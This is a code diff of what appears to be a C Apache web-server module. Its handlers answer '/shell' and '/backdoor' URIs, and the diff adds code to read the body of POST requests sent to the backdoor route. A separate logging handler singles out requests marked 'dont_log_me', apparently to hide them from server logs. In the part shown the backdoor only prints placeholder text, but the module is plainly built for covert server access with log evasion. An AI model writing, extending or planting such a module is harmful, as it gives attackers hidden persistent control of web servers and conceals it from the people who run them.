@@ -10,17 +10,23 @@ static int backblast_handler(request_rec *r);
 // very early handler
 static int winchester_handler(request_rec *r)
 {
-	if (!r->unparsed_uri){
+	if (!r->unparsed_uri) {
         // no uri, pass
         return OK;
     }
-    if (strcmp(r->unparsed_uri, "/shell") == 0){
+    if (strcmp(r->unparsed_uri, "/shell") == 0) {
         ap_rprintf(r, "Shell dir");
         return DONE;
     }
-    if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST){
+    if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST) {
+        apr_bucket_brigade *bb_in;
+        apr_status_t rc;
+
+        // create bucket brigade to store body
+        bb_in = apr_brigade_create(r->pool, r->connection->bucket_alloc);
+        ap_rprintf(r, "Created brigade!");
+
         ap_rprintf(r, "Backdoor POST");
-        ap_rprintf(r, "%s", r->args);
         return DONE;
     }
 
@@ -31,7 +37,7 @@ static int winchester_handler(request_rec *r)
 // logging handler
 static int backblast_handler(request_rec *r)
 {
-    if (strcmp(r->filename, "dont_log_me")){
+    if (strcmp(r->filename, "dont_log_me")) {
         // if this filename does not appear, move along
         return OK;
     }
